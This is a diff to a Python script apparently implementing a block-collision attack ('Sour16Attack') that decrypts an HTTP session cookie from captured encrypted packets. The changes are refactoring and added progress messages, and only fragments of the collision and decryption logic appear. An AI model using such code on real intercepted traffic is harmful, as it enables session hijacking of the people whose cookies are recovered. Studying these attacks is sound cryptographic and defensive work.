@@ -1,4 +1,4 @@
-#! env python
+#!/usr/bin/env python3
 
 import argparse
 import packetfile
@@ -39,7 +39,6 @@ class Sour16Attack:
         self.round_trips = packetfile.read_packets(filename, self.BLOCK_SIZE_BYTES)
 
         self.encrypted_cookie_blocks = self._find_encrypted_cookie_blocks(self.round_trips)
-        print('Some Encrypted cookie blocks look like this: ', list(self.encrypted_cookie_blocks.keys())[:5])
         self.decrypted_cookie_blocks = [None] * (len(self.COOKIE_LOCATION) - 1)
 
     def decrypt_cookie(self):
@@ -62,11 +61,18 @@ class Sour16Attack:
                 if response['cipher'][i] in self.encrypted_cookie_blocks:
                     self._decrypt_block(response, self.KNOWN_PLAIN_TEXTS["response"], i)
 
-            if all([(x is not None) for x in self.decrypted_cookie_blocks]):
+            if self._cookie_is_fully_decrypted():
                 print("Retrieved the entire cookie!", "".join(self.decrypted_cookie_blocks))
                 break
 
+        if not self._cookie_is_fully_decrypted():
+            print("Cookie was not fully decrypted. Partial result: ", self.decrypted_cookie_blocks)
+            print("We need more blocks! Or more luck.")
+
         return self.decrypted_cookie_blocks
+
+    def _cookie_is_fully_decrypted(self):
+        return all([(x is not None) for x in self.decrypted_cookie_blocks])
 
     def _find_encrypted_cookie_blocks(self, encrypted_round_trips):
         encrypted = {}
@@ -92,6 +98,9 @@ class Sour16Attack:
             return
 
         plain = plaintext[block_index]
+        print("Collision found between encryption of block: '{}' and a cookie block."
+              .format(plain.replace("\n", "\\n")))
+
         if block_index != 0:
             prev = cipher[block_index - 1]
         else:
